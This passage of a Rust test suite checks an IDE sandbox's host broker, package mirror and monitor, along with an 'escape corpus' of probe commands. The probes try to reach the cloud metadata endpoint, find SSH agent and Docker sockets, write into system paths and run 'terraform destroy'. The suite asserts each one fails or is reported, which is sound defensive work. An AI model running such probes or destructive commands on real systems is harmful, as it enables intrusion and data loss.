    fn approve(
        &self,
        _request: &pks_sandbox::linux::broker::Request,
    ) -> pks_sandbox::linux::broker::Decision {
        pks_sandbox::linux::broker::Decision::Allow
    }
    fn copy_url(&self, url: &str) -> Result<(), String> {
        self.calls
            .lock()
            .map_err(|e| e.to_string())?
            .push(format!("copy {url}"));
        Ok(())
    }
    fn open_url(&self, url: &str) -> Result<(), String> {
        self.calls
            .lock()
            .map_err(|e| e.to_string())?
            .push(format!("open {url}"));
        Ok(())
    }
    fn push(&self, remote: &str, branch: &str) -> Result<(), String> {
        self.calls
            .lock()
            .map_err(|e| e.to_string())?
            .push(format!("push {remote} {branch}"));
        Ok(())
    }
    fn warn(&self, message: &str) {
        if let Ok(mut calls) = self.calls.lock() {
            calls.push(format!("warn {message}"));
        }
    }
}

/// PRD scenario 12 and Phase 12.1 and 12.3, from inside the sandbox: `xdg-open`
/// and `git push` reach the host, and anything else is refused or stays local.
#[test]
fn the_sandbox_opens_urls_and_pushes_only_through_the_host() -> TestResult {
    let layout = Layout::new()?;
    let broker_dir = tempfile::tempdir()?;
    let listener = UnixListener::bind(broker_dir.path().join("request.sock"))?;
    let recorder = Arc::new(Recorder::default());
    let handler: Arc<dyn pks_sandbox::linux::broker::Handler + Send + Sync> = recorder.clone();
    let stop = Arc::new(AtomicBool::new(false));
    let flag = Arc::clone(&stop);
    let server =
        std::thread::spawn(move || pks_sandbox::linux::broker::serve(listener, handler, flag));

    // Each step must succeed, or the script exits with that step's number.
    let script = "xdg-open 'https://accounts.example.com/oauth' || exit 11\n\
git push origin main || exit 12\n\
git --version > /workspace/version.txt || exit 13\n\
git push --force origin main 2>/dev/null; [ $? -eq 2 ] || exit 14\n\
exit 0\n";
    let mut spec = layout.spec_running(script);
    spec.broker_dir = Some(broker_dir.path().to_path_buf());
    let status = backend()?.run(&spec);
    stop.store(true, Ordering::Relaxed);
    let _ = server.join();
    let status = status?;
    assert!(status.success(), "exit {status}");

    let calls = recorder.calls.lock().map_err(|e| e.to_string())?.clone();
    assert_eq!(
        calls,
        vec![
            "open https://accounts.example.com/oauth".to_owned(),
            "push origin main".to_owned(),
            "warn blocked: a forced push is not allowed through the broker".to_owned()
        ],
        "the host was asked for exactly these actions"
    );
    let version = fs::read_to_string(layout.repo.join("version.txt"))?;
    assert!(version.starts_with("git version"), "{version}");
    Ok(())
}

/// Phase 12.2: a connection to the host's port 3128 reaches the IDE's listener
/// on the same port inside the sandbox, as the OAuth callback does.
#[test]
fn the_oauth_callback_reaches_the_ide_listener_inside_the_sandbox() -> TestResult {
    let layout = Layout::new()?;
    fs::write(
        layout.repo.join("callback.py"),
        "import socket\n\
s = socket.socket()\n\
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\
s.bind(('127.0.0.1', 3128))\n\
s.listen(1)\n\
c, _ = s.accept()\n\
c.sendall(b'hello')\n\
c.close()\n",
    )?;
    let broker_dir = tempfile::tempdir()?;
    let host_listener = std::net::TcpListener::bind("127.0.0.1:3128")?;
    let stop = Arc::new(AtomicBool::new(false));
    let flag = Arc::clone(&stop);
    let agent = broker_dir.path().join("callback.sock");
    let relay = std::thread::spawn(move || {
        pks_sandbox::linux::broker::callback_host(host_listener, agent, flag)
    });

    let mut spec = layout.spec_running("python3 /workspace/callback.py &\nsleep 6\nexit 0\n");
    spec.broker_dir = Some(broker_dir.path().to_path_buf());
    let backend = backend()?;
    let runner = std::thread::spawn(move || backend.run(&spec));

    // The IDE's listener starts a moment after the sandbox. Connections made
    // before that are closed without data, so retry until the greeting comes.
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(15);
    let mut greeting = String::new();
    while std::time::Instant::now() < deadline && greeting.is_empty() {
        if let Ok(mut client) = std::net::TcpStream::connect("127.0.0.1:3128") {
            client.set_read_timeout(Some(std::time::Duration::from_secs(2)))?;
            let _ = std::io::Read::read_to_string(&mut client, &mut greeting);
        }
        if greeting.is_empty() {
            std::thread::sleep(std::time::Duration::from_millis(200));
        }
    }
    let status = runner.join().map_err(|_| "the sandbox thread panicked")??;
    stop.store(true, Ordering::Relaxed);
    let _ = relay.join();
    assert!(status.success(), "exit {status}");
    assert_eq!(
        greeting, "hello",
        "the callback did not reach the IDE listener"
    );
    Ok(())
}

// --- package mirror (Phase 14) -----------------------------------------------

/// A registry with one old version of `pkg`.
struct OneOldVersion;

impl pks_registry::mirror::Source for OneOldVersion {
    fn fetch(
        &self,
        _url: &str,
        _accept: Option<&str>,
    ) -> Result<Vec<u8>, pks_registry::upstream::UpstreamError> {
        Ok(serde_json::json!({
            "name": "pkg",
            "dist-tags": { "latest": "1.0.0" },
            "versions": { "1.0.0": { "dist": { "tarball": "https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz" } } },
            "time": { "created": "2014-01-01T00:00:00Z", "1.0.0": "2014-01-01T00:00:00Z" },
        })
        .to_string()
        .into_bytes())
    }
}

/// OSV with nothing to report.
struct NoMalware;

impl pks_registry::osv::Advisories for NoMalware {
    fn check(&self, _: &str, _: &str, _: &str) -> pks_registry::osv::Verdict {
        pks_registry::osv::Verdict::Clean
    }
}

/// The current time in Unix seconds.
fn now_seconds() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |d| i64::try_from(d.as_secs()).unwrap_or(i64::MAX))
}

/// The sandbox reaches the mirror on its loopback port, which the relay passes
/// to the mirror's Unix socket on the host.
#[test]
fn the_sandbox_reaches_the_mirror_on_its_loopback_port() -> TestResult {
    let layout = Layout::new()?;
    let mirror_dir = tempfile::tempdir()?;
    let listener = UnixListener::bind(mirror_dir.path().join("mirror.sock"))?;
    let mirror = Arc::new(pks_registry::mirror::Mirror::new(
        OneOldVersion,
        pks_sandbox::linux::bwrap::MIRROR_URL,
        Box::new(|| 1_800_000_000),
        Box::new(NoMalware),
    ));
    let stop = Arc::new(AtomicBool::new(false));
    let flag = Arc::clone(&stop);
    let server = std::thread::spawn(move || {
        pks_registry::server::serve(listener, mirror, Arc::new(|_: &str| {}), flag)
    });

    let script = "curl -s -o /workspace/doc.json -w '%{http_code}' http://127.0.0.1:3130/npm/pkg > /workspace/status.txt || exit 5\nexit 0\n";
    let mut spec = layout.spec_running(script);
    spec.mirror_socket = Some(mirror_dir.path().join("mirror.sock"));
    let status = backend()?.run(&spec);
    stop.store(true, Ordering::Relaxed);
    let _ = server.join();
    assert!(status?.success());
    assert_eq!(
        fs::read_to_string(layout.repo.join("status.txt"))?.trim(),
        "200"
    );
    assert!(fs::read_to_string(layout.repo.join("doc.json"))?.contains("\"versions\""));
    Ok(())
}

/// PRD FR-REG, end to end with the real registry: npm inside the sandbox
/// installs a real package through the mirror, and a direct connection to the
/// registry is refused. Needs internet access to registry.npmjs.org.
#[test]
fn npm_installs_a_real_package_through_the_mirror_and_direct_access_is_refused() -> TestResult {
    let layout = Layout::new()?;
    let mirror_dir = tempfile::tempdir()?;
    let listener = UnixListener::bind(mirror_dir.path().join("mirror.sock"))?;
    let upstream = Arc::new(pks_registry::upstream::Upstream::new().map_err(|e| e.to_string())?);
    let osv = pks_registry::osv::Osv::new(Arc::clone(&upstream), Box::new(now_seconds));
    let mirror = Arc::new(pks_registry::mirror::Mirror::new(
        Arc::clone(&upstream),
        pks_sandbox::linux::bwrap::MIRROR_URL,
        Box::new(now_seconds),
        Box::new(osv),
    ));
    let stop = Arc::new(AtomicBool::new(false));
    let flag = Arc::clone(&stop);
    let server = std::thread::spawn(move || {
        pks_registry::server::serve(listener, mirror, Arc::new(|_: &str| {}), flag)
    });

    let script = format!(
        "{}{}",
        host_tool_path(&["npm", "node"])?,
        "cd /workspace || exit 2\nnpm config get registry > /workspace/registry.txt || exit 3\nnpm install left-pad@1.3.0 --no-audit --no-fund > /workspace/npm.log 2>&1 || exit 4\ntest -f /workspace/node_modules/left-pad/package.json || exit 5\ncurl -s -m 15 https://registry.npmjs.org/left-pad > /dev/null 2>&1; echo $? > /workspace/direct.txt\nexit 0\n"
    );
    let mut spec = layout.spec_running(&script);
    spec.mirror_socket = Some(mirror_dir.path().join("mirror.sock"));
    let status = backend()?.run(&spec);
    stop.store(true, Ordering::Relaxed);
    let _ = server.join();
    let status = status?;
    let log = fs::read_to_string(layout.repo.join("npm.log")).unwrap_or_default();
    assert!(status.success(), "exit {status}; npm log:\n{log}");
    let registry = fs::read_to_string(layout.repo.join("registry.txt"))?;
    assert!(
        registry.contains("127.0.0.1:3130"),
        "npm does not use the mirror: {registry}"
    );
    let direct = fs::read_to_string(layout.repo.join("direct.txt"))?;
    assert_ne!(direct.trim(), "0", "a direct registry connection succeeded");
    Ok(())
}

/// PRD FR-REG, end to end with the real PyPI: pip inside the sandbox installs
/// a real package through the mirror. Needs internet access to pypi.org.
#[test]
fn pip_installs_a_real_package_through_the_mirror() -> TestResult {
    let layout = Layout::new()?;
    let mirror_dir = tempfile::tempdir()?;
    let listener = UnixListener::bind(mirror_dir.path().join("mirror.sock"))?;
    let upstream = Arc::new(pks_registry::upstream::Upstream::new().map_err(|e| e.to_string())?);
    let osv = pks_registry::osv::Osv::new(Arc::clone(&upstream), Box::new(now_seconds));
    let mirror = Arc::new(pks_registry::mirror::Mirror::new(
        Arc::clone(&upstream),
        pks_sandbox::linux::bwrap::MIRROR_URL,
        Box::new(now_seconds),
        Box::new(osv),
    ));
    let stop = Arc::new(AtomicBool::new(false));
    let flag = Arc::clone(&stop);
    let server = std::thread::spawn(move || {
        pks_registry::server::serve(listener, mirror, Arc::new(|_: &str| {}), flag)
    });

    let script = "cd /workspace || exit 2\npython3 -m pip install --no-deps --target /workspace/pylib requests==2.34.2 > /workspace/pip.log 2>&1 || exit 4\ntest -d /workspace/pylib/requests || exit 5\nexit 0\n";
    let mut spec = layout.spec_running(script);
    spec.mirror_socket = Some(mirror_dir.path().join("mirror.sock"));
    let status = backend()?.run(&spec);
    stop.store(true, Ordering::Relaxed);
    let _ = server.join();
    let status = status?;
    let log = fs::read_to_string(layout.repo.join("pip.log")).unwrap_or_default();
    assert!(status.success(), "exit {status}; pip log:\n{log}");
    Ok(())
}

/// The sandbox's PATH is `/usr/bin:/bin`. On some hosts (GitHub's Ubuntu
/// runners, for example) `npm` and `node` live in `/usr/local/bin`, which the
/// sandbox does see (it binds `/usr` read-only) but does not search. This
/// returns a script line that adds the directories of `tools` to the front of
/// PATH. It is empty when `tools` is empty.
fn host_tool_path(tools: &[&str]) -> Result<String, Box<dyn std::error::Error>> {
    if tools.is_empty() {
        return Ok(String::new());
    }
    let search = std::env::var_os("PATH").unwrap_or_default();
    let mut dirs: Vec<String> = Vec::new();
    for tool in tools {
        let dir = std::env::split_paths(&search)
            .find(|dir| dir.join(tool).is_file())
            .ok_or_else(|| format!("{tool} is not installed on the host"))?;
        let dir = dir
            .to_str()
            .ok_or("a tool directory is not UTF-8")?
            .to_owned();
        if dir.contains(['"', '$', '`', '\\']) {
            return Err(format!("{dir} has a character the script cannot quote").into());
        }
        if !dirs.contains(&dir) {
            dirs.push(dir);
        }
    }
    Ok(format!("export PATH=\"{}:$PATH\"\n", dirs.join(":")))
}

/// Runs `script` in the sandbox with the package mirror on, and stops the
/// mirror afterwards. `tools` are host programs the script needs on PATH.
/// Needs internet access to the registries.
fn run_through_mirror(
    layout: &Layout,
    tools: &[&str],
    script: &str,
) -> Result<std::process::ExitStatus, Box<dyn std::error::Error>> {
    let script = format!("{}{script}", host_tool_path(tools)?);
    let mirror_dir = tempfile::tempdir()?;
    let listener = UnixListener::bind(mirror_dir.path().join("mirror.sock"))?;
    let upstream = Arc::new(pks_registry::upstream::Upstream::new().map_err(|e| e.to_string())?);
    let osv = pks_registry::osv::Osv::new(Arc::clone(&upstream), Box::new(now_seconds));
    let mirror = Arc::new(pks_registry::mirror::Mirror::new(
        Arc::clone(&upstream),
        pks_sandbox::linux::bwrap::MIRROR_URL,
        Box::new(now_seconds),
        Box::new(osv),
    ));
    let stop = Arc::new(AtomicBool::new(false));
    let flag = Arc::clone(&stop);
    let server = std::thread::spawn(move || {
        pks_registry::server::serve(listener, mirror, Arc::new(|_: &str| {}), flag)
    });
    let mut spec = layout.spec_running(&script);
    spec.mirror_socket = Some(mirror_dir.path().join("mirror.sock"));
    let status = backend()?.run(&spec);
    stop.store(true, Ordering::Relaxed);
    let _ = server.join();
    Ok(status?)
}

/// Asserts the sandbox run succeeded, printing the client log if not.
fn assert_client_ok(
    layout: &Layout,
    status: std::process::ExitStatus,
) -> Result<(), Box<dyn std::error::Error>> {
    let log = fs::read_to_string(layout.repo.join("client.log")).unwrap_or_default();
    assert!(status.success(), "exit {status}; client log:\n{log}");
    Ok(())
}

/// PRD FR-REG, clients: pnpm 12.21.0 is installed through the mirror and
/// then installs a real package. Needs internet access to registry.npmjs.org.
#[test]
fn pnpm_installs_a_real_package_through_the_mirror() -> TestResult {
    let layout = Layout::new()?;
    let script = r#"
mkdir -p /home/sandbox/tools && cd /home/sandbox/tools || exit 2
npm install pnpm@12.21.0 --no-audit --no-fund > /workspace/client.log 2>&1 || exit 3
mkdir -p /workspace/app && cd /workspace/app || exit 4
echo '{"name":"app","version":"1.0.0"}' > package.json
/home/sandbox/tools/node_modules/.bin/pnpm --version > /workspace/version.txt || exit 5
/home/sandbox/tools/node_modules/.bin/pnpm config get registry > /workspace/registry.txt || exit 6
/home/sandbox/tools/node_modules/.bin/pnpm add left-pad@1.3.0 >> /workspace/client.log 2>&1 || exit 7
test -f node_modules/left-pad/package.json || exit 8
exit 0
"#;
    let status = run_through_mirror(&layout, &["npm", "node"], script)?;
    assert_client_ok(&layout, status)?;
    assert_eq!(
        fs::read_to_string(layout.repo.join("version.txt"))?.trim(),
        "12.21.0"
    );
    let registry = fs::read_to_string(layout.repo.join("registry.txt"))?;
    assert!(
        registry.contains("127.0.0.1:3130"),
        "pnpm does not use the mirror: {registry}"
    );
    Ok(())
}

/// PRD FR-REG, clients: yarn 1.22.22 (the npm `latest` tag of `yarn`) is
/// installed through the mirror and then installs a real package.
#[test]
fn yarn_installs_a_real_package_through_the_mirror() -> TestResult {
    let layout = Layout::new()?;
    let script = r#"
mkdir -p /home/sandbox/tools && cd /home/sandbox/tools || exit 2
npm install yarn@1.22.22 --no-audit --no-fund > /workspace/client.log 2>&1 || exit 3
mkdir -p /workspace/app && cd /workspace/app || exit 4
echo '{"name":"app","version":"1.0.0"}' > package.json
/home/sandbox/tools/node_modules/.bin/yarn --version > /workspace/version.txt || exit 5
/home/sandbox/tools/node_modules/.bin/yarn add left-pad@1.3.0 >> /workspace/client.log 2>&1 || exit 6
test -f node_modules/left-pad/package.json || exit 7
exit 0
"#;
    let status = run_through_mirror(&layout, &["npm", "node"], script)?;
    assert_client_ok(&layout, status)?;
    assert_eq!(
        fs::read_to_string(layout.repo.join("version.txt"))?.trim(),
        "1.22.22"
    );
    Ok(())
}

/// PRD FR-REG, clients: bun 1.4.4 is installed through the mirror and then
/// installs a real package. The `bun` npm package fetches its binary in a
/// postinstall script, which the sandbox keeps off, so the platform package
/// that ships the binary is installed instead. Needs internet access to
/// registry.npmjs.org.
#[test]
fn bun_installs_a_real_package_through_the_mirror() -> TestResult {
    let layout = Layout::new()?;
    let script = r#"
mkdir -p /home/sandbox/tools && cd /home/sandbox/tools || exit 2
npm install @oven/bun-linux-x64@1.4.4 --no-audit --no-fund > /workspace/client.log 2>&1 || exit 3
BUN=/home/sandbox/tools/node_modules/@oven/bun-linux-x64/bin/bun
mkdir -p /workspace/app && cd /workspace/app || exit 4
echo '{"name":"app","version":"1.0.0"}' > package.json
$BUN --version > /workspace/version.txt || exit 5
$BUN add left-pad@1.3.0 >> /workspace/client.log 2>&1 || exit 6
test -f node_modules/left-pad/package.json || exit 7
exit 0
"#;
    let status = run_through_mirror(&layout, &["npm", "node"], script)?;
    assert_client_ok(&layout, status)?;
    assert_eq!(
        fs::read_to_string(layout.repo.join("version.txt"))?.trim(),
        "1.4.4"
    );
    Ok(())
}

/// PRD FR-REG, clients: poetry 2.5.1 is installed through the mirror. Its
/// PyPI source is replaced by the mirror as a primary source, so it resolves
/// `requests` through the mirror only. Needs internet access to pypi.org.
#[test]
fn poetry_resolves_a_real_package_through_the_mirror() -> TestResult {
    let layout = Layout::new()?;
    let script = r#"
mkdir -p /home/sandbox/tools && python3 -m venv /home/sandbox/tools/poetry-venv || exit 2
/home/sandbox/tools/poetry-venv/bin/pip install poetry==2.5.1 > /workspace/client.log 2>&1 || exit 3
/home/sandbox/tools/poetry-venv/bin/poetry --version > /workspace/version.txt || exit 4
mkdir -p /workspace/app && cd /workspace/app || exit 5
printf '[project]\nname = "app"\nversion = "0.1.0"\nrequires-python = ">=3.10"\ndependencies = []\n' > pyproject.toml
/home/sandbox/tools/poetry-venv/bin/poetry source add --priority=primary mirror http://127.0.0.1:3130/pypi/simple/ >> /workspace/client.log 2>&1 || exit 6
/home/sandbox/tools/poetry-venv/bin/poetry add requests==2.34.2 --no-interaction >> /workspace/client.log 2>&1 || exit 7
grep -q 'version = "2.34.2"' poetry.lock || exit 8
exit 0
"#;
    let status = run_through_mirror(&layout, &[], script)?;
    assert_client_ok(&layout, status)?;
    let version = fs::read_to_string(layout.repo.join("version.txt"))?;
    assert!(version.contains("2.5.1"), "{version}");
    Ok(())
}

/// PRD FR-REG, clients: uv 0.13.9 is installed through the mirror and then
/// installs a real package with `UV_DEFAULT_INDEX` pointing at the mirror.
/// Needs internet access to pypi.org.
#[test]
fn uv_installs_a_real_package_through_the_mirror() -> TestResult {
    let layout = Layout::new()?;
    let script = r#"
mkdir -p /home/sandbox/tools && python3 -m venv /home/sandbox/tools/uv-venv || exit 2
/home/sandbox/tools/uv-venv/bin/pip install uv==0.13.9 > /workspace/client.log 2>&1 || exit 3
/home/sandbox/tools/uv-venv/bin/uv --version > /workspace/version.txt || exit 4
mkdir -p /workspace/app && cd /workspace/app || exit 5
/home/sandbox/tools/uv-venv/bin/uv venv .venv >> /workspace/client.log 2>&1 || exit 6
/home/sandbox/tools/uv-venv/bin/uv pip install --python .venv/bin/python requests==2.34.2 >> /workspace/client.log 2>&1 || exit 7
ls -d .venv/lib/python3*/site-packages/requests > /dev/null 2>&1 || exit 8
exit 0
"#;
    let status = run_through_mirror(&layout, &[], script)?;
    assert_client_ok(&layout, status)?;
    let version = fs::read_to_string(layout.repo.join("version.txt"))?;
    assert!(version.starts_with("uv 0.13.9"), "{version}");
    Ok(())
}

/// The sandbox's status, the monitor's events, and the monitor's failures.
type Monitored = (
    std::process::ExitStatus,
    Vec<pks_sandbox::linux::notify::Event>,
    Vec<String>,
);

/// Runs `script` in the sandbox with the monitor on. The monitor is served on
/// its own thread, as the session does. Returns the sandbox's status, every
/// event the monitor saw, and any monitor failures.
fn run_monitored(layout: &Layout, script: &str) -> Result<Monitored, Box<dyn std::error::Error>> {
    use pks_sandbox::linux::notify::{Event, serve_monitor};
    use std::sync::Mutex;
    let dir = tempfile::tempdir()?;
    let socket = dir.path().join("supervisor.sock");
    let listener = UnixListener::bind(&socket)?;
    let stop = Arc::new(AtomicBool::new(false));
    let events: Arc<Mutex<Vec<Event>>> = Arc::default();
    let lost: Arc<Mutex<Vec<String>>> = Arc::default();
    let (flag, sink, lost_sink) = (Arc::clone(&stop), Arc::clone(&events), Arc::clone(&lost));
    let monitor = std::thread::spawn(move || {
        serve_monitor(
            &listener,
            &flag,
            |event| {
                if let Ok(mut list) = sink.lock() {
                    list.push(event);
                }
            },
            |reason| {
                if let Ok(mut list) = lost_sink.lock() {
                    list.push(reason.to_owned());
                }
            },
        );
    });
    let mut spec = layout.spec_running(script);
    spec.supervisor_socket = Some(socket.clone());
    let status = backend()?.run(&spec);
    stop.store(true, Ordering::Relaxed);
    // Unblocks the monitor if no sandbox ever connected to it.
    let _ = std::os::unix::net::UnixStream::connect(&socket);
    monitor.join().map_err(|_| "the monitor thread panicked")?;
    let events = events.lock().map(|list| list.clone()).unwrap_or_default();
    let lost = lost.lock().map(|list| list.clone()).unwrap_or_default();
    Ok((status?, events, lost))
}

/// The findings the detection rules make of the monitor's events.
fn monitor_findings(events: &[pks_sandbox::linux::notify::Event]) -> Vec<Finding> {
    use pks_sandbox::linux::notify::Event;
    let allowed = [3129, 3130];
    events
        .iter()
        .flat_map(|event| match event {
            Event::Exec {
                path,
                argv,
                interactive,
                ..
            } => pks_detect::monitor::exec_findings(path, argv, *interactive),
            Event::Connect { target, .. } => {
                pks_detect::monitor::connect_finding(*target, &allowed)
                    .into_iter()
                    .collect()
            }
            Event::OtherConnect { .. } => Vec::new(),
        })
        .collect()
}

/// PRD scenario 9: `terraform destroy` in the IDE terminal is reported HIGH
/// (EXEC-DESTRUCTIVE), and the command still runs (the monitor only reports).
#[test]
fn scenario_9_terraform_destroy_is_reported_and_is_not_blocked() -> TestResult {
    let layout = Layout::new()?;
    let script = "cd /workspace || exit 2\nprintf '#!/bin/sh\\nexit 1\\n' > /workspace/terraform || exit 3\nchmod +x /workspace/terraform || exit 4\n/workspace/terraform destroy -auto-approve > /workspace/tf.log 2>&1\necho finished > /workspace/finished.txt\nexit 0\n";
    let (status, events, lost) = run_monitored(&layout, script)?;
    assert!(status.success(), "{status}");
    assert!(lost.is_empty(), "{lost:?}");
    assert!(
        layout.repo.join("finished.txt").exists(),
        "the script did not reach its end"
    );
    let findings = monitor_findings(&events);
    assert!(
        findings
            .iter()
            .any(|f| f.rule.as_str() == "EXEC-DESTRUCTIVE"
                && f.severity == Severity::High
                && f.target.ends_with("/terraform")),
        "{findings:?}"
    );
    Ok(())
}

/// PRD scenario 7: a connection to a host port that is not listed gets
/// NET-DIRECT-CONNECT, with the `host_ports` hint.
#[test]
fn scenario_7_a_direct_connection_to_a_host_port_gets_the_host_ports_hint() -> TestResult {
    let layout = Layout::new()?;
    let script = "curl -s -m 3 http://127.0.0.1:5432/ > /dev/null 2>&1\necho finished > /workspace/finished.txt\nexit 0\n";
    let (status, events, lost) = run_monitored(&layout, script)?;
    assert!(status.success(), "{status}");
    assert!(lost.is_empty(), "{lost:?}");
    assert!(layout.repo.join("finished.txt").exists());
    let findings = monitor_findings(&events);
    let direct = findings
        .iter()
        .find(|f| f.rule.as_str() == "NET-DIRECT-CONNECT")
        .unwrap_or_else(|| panic!("no NET-DIRECT-CONNECT in {findings:?}"));
    assert_eq!(direct.severity, Severity::Warn);
    assert_eq!(direct.target, "127.0.0.1:5432");
    assert!(direct.fix.contains("host_ports = [5432]"), "{}", direct.fix);
    Ok(())
}

/// Fail closed (Phase 15.3): without a monitor the sandbox does not start, so
/// the IDE's script never runs.
#[test]
fn the_sandbox_does_not_start_without_its_monitor() -> TestResult {
    let layout = Layout::new()?;
    let mut spec = layout.spec_running("echo ran > /workspace/ran.txt\nexit 0\n");
    spec.supervisor_socket = Some(PathBuf::from("/definitely/not/here/supervisor.sock"));
    let result = backend()?.run(&spec);
    assert!(
        !layout.repo.join("ran.txt").exists(),
        "the IDE ran without its monitor"
    );
    assert!(result.map(|status| !status.success()).unwrap_or(true));
    Ok(())
}

/// Fail closed (Phase 15.3): when the monitor fails, the failure is reported
/// and the sandbox is killed. Here the monitor's event handler fails on the
/// first event, and the failure handler kills the sandbox, as the session
/// does.
#[test]
fn a_failing_monitor_is_reported_and_ends_the_sandbox() -> TestResult {
    use pks_sandbox::linux::notify::serve_monitor;
    use pks_sandbox::linux::signal::{Signal, signal_tree};
    let layout = Layout::new()?;
    let dir = tempfile::tempdir()?;
    let socket = dir.path().join("supervisor.sock");
    let listener = UnixListener::bind(&socket)?;
    let pid_dir = dir.path().to_path_buf();
    let stop = Arc::new(AtomicBool::new(false));
    let flag = Arc::clone(&stop);
    let lost: Arc<std::sync::Mutex<Vec<String>>> = Arc::default();
    let lost_sink = Arc::clone(&lost);
    let monitor = std::thread::spawn(move || {
        serve_monitor(
            &listener,
            &flag,
            |_event| panic!("the monitor fails on its first event"),
            |reason| {
                if let Ok(mut list) = lost_sink.lock() {
                    list.push(reason.to_owned());
                }
                if let Some(pid) = pks_detect::read_pid(&pid_dir) {
                    let _ = signal_tree(pid, Signal::Kill);
                }
            },
        );
    });
    let mut spec =
        layout.spec_running("sleep 30\necho finished > /workspace/finished.txt\nexit 0\n");
    spec.supervisor_socket = Some(socket.clone());
    spec.pid_file = Some(dir.path().join(pks_detect::PID_FILE));
    let started = std::time::Instant::now();
    let status = backend()?.run(&spec);
    stop.store(true, Ordering::Relaxed);
    let _ = std::os::unix::net::UnixStream::connect(&socket);
    let _ = monitor.join();
    assert!(
        started.elapsed() < std::time::Duration::from_secs(25),
        "the sandbox was not ended: {:?}",
        started.elapsed()
    );
    assert!(
        !layout.repo.join("finished.txt").exists(),
        "the IDE kept running"
    );
    let reasons = lost.lock().map(|list| list.clone()).unwrap_or_default();
    assert_eq!(reasons, ["the monitor panicked"], "{reasons:?}");
    assert!(status.map(|status| !status.success()).unwrap_or(true));
    Ok(())
}

/// Runs one attack command inside the sandbox and returns its exit status.
/// The command runs in `/workspace`, so its exit status is recorded there.
fn attempt(command: &str) -> Result<i32, Box<dyn std::error::Error>> {
    let layout = Layout::new()?;
    let script =
        format!("cd /workspace || exit 2\n{command}\necho $? > /workspace/attempt.txt\nexit 0\n");
    let status = backend()?.run(&layout.spec_running(&script))?;
    assert!(status.success(), "the sandbox did not run: {status}");
    Ok(fs::read_to_string(layout.repo.join("attempt.txt"))?
        .trim()
        .parse()?)
}

/// Escape corpus FS-01: the real host home directory is not visible.
#[test]
fn corpus_fs_01_the_host_home_directory_is_not_visible() -> TestResult {
    let home = std::env::var("HOME")?;
    assert_ne!(attempt(&format!("test -e '{home}'"))?, 0);
    Ok(())
}

/// Escape corpus FS-02: the system files are read-only.
#[test]
fn corpus_fs_02_writes_to_the_system_are_refused() -> TestResult {
    assert_ne!(attempt("touch /usr/pks-corpus-probe")?, 0);
    assert_ne!(attempt("touch /etc/pks-corpus-probe")?, 0);
    Ok(())
}

/// Escape corpus FS-03: the sandbox cannot write to the host's home or to a
/// path that only looks like it (a prefix of the repo).
#[test]
fn corpus_fs_03_writes_outside_the_repo_and_ide_home_are_refused() -> TestResult {
    assert_ne!(attempt("touch /var/pks-corpus-probe")?, 0);
    assert_ne!(attempt("touch /root/pks-corpus-probe")?, 0);
    Ok(())
}

/// Escape corpus NET-01: direct connections to the internet are refused.
#[test]
fn corpus_net_01_a_direct_internet_connection_is_refused() -> TestResult {
    // --noproxy: the connection must not go through the proxy at all.
    assert_ne!(
        attempt("curl --noproxy '*' -s -m 5 http://1.1.1.1/ > /dev/null 2>&1")?,
        0
    );
    Ok(())
}

/// Escape corpus NET-02: the cloud metadata address is unreachable.
#[test]
fn corpus_net_02_the_cloud_metadata_address_is_unreachable() -> TestResult {
    assert_ne!(
        attempt("curl --noproxy '*' -s -m 5 http://169.254.169.254/ > /dev/null 2>&1")?,
        0
    );
    Ok(())
}

/// Escape corpus NET-03: no name resolution leaves the sandbox.
#[test]
fn corpus_net_03_direct_name_resolution_fails() -> TestResult {
    assert_ne!(attempt("getent hosts example.com > /dev/null 2>&1")?, 0);
    Ok(())
}

/// Escape corpus NET-04: a registry cannot be reached directly; the mirror is
/// the only route (PRD FR-REG).
#[test]
fn corpus_net_04_a_registry_cannot_be_reached_directly() -> TestResult {
    assert_ne!(
        attempt("curl --noproxy '*' -s -m 5 https://registry.npmjs.org/ > /dev/null 2>&1")?,
        0
    );
    assert_ne!(
        attempt("curl --noproxy '*' -s -m 5 https://pypi.org/simple/ > /dev/null 2>&1")?,
        0
    );
    Ok(())
}

/// Escape corpus IPC-01: no SSH agent socket is passed in.
#[test]
fn corpus_ipc_01_no_ssh_agent_is_passed_in() -> TestResult {
    assert_ne!(attempt("test -n \"$SSH_AUTH_SOCK\"")?, 0);
    Ok(())
}

/// Escape corpus IPC-02: the container socket is not mounted.
#[test]
fn corpus_ipc_02_no_container_socket_is_mounted() -> TestResult {
    assert_ne!(
        attempt("test -e /var/run/docker.sock || test -e /run/docker.sock")?,
        0
    );
    Ok(())
}

/// Escape corpus IPC-03: no D-Bus session bus is reachable.
#[test]
fn corpus_ipc_03_no_dbus_session_bus_is_reachable() -> TestResult {
    assert_ne!(
        attempt("test -n \"$DBUS_SESSION_BUS_ADDRESS\" || test -e /run/user/$(id -u)/bus")?,
        0
    );
    Ok(())
}

/// Escape corpus PROC-01: host processes are not visible. The test process is
/// a host process, so its PID must not exist inside the sandbox.
#[test]
fn corpus_proc_01_host_processes_are_not_visible() -> TestResult {
    let host_pid = std::process::id();
    assert_ne!(attempt(&format!("test -d /proc/{host_pid}"))?, 0);
    Ok(())
}

/// Control for the corpus harness: an allowed action reports success, so the
/// corpus's failed attempts mean something.
#[test]
fn corpus_control_the_harness_reports_success_and_failure() -> TestResult {
    assert_eq!(attempt("true")?, 0);
    assert_ne!(attempt("false")?, 0);
    Ok(())
}

/// A connect target port with the listening ports of the connecting process.
type Samples = Vec<(u16, Vec<u16>)>;

/// The IDE's own loopback services are not reported. The listeners of the
/// connecting process are read while its connect is pending, which is when
/// the monitor reads them. A connection to a port the sandbox listens on is
/// then allowed; a connection to a port nothing listens on is still reported.
#[test]
fn a_connection_to_the_sandboxs_own_listener_is_expected_and_others_are_not() -> TestResult {
    use pks_sandbox::linux::notify::{Event, listening_ports, serve_monitor};
    use std::sync::Mutex;
    let layout = Layout::new()?;
    let dir = tempfile::tempdir()?;
    let socket = dir.path().join("supervisor.sock");
    let listener = UnixListener::bind(&socket)?;
    let stop = Arc::new(AtomicBool::new(false));
    let flag = Arc::clone(&stop);
    // (target port, listening ports of the connecting process), read at event time.
    let seen: Arc<Mutex<Samples>> = Arc::default();
    let sink = Arc::clone(&seen);
    let monitor = std::thread::spawn(move || {
        serve_monitor(
            &listener,
            &flag,
            |event| {
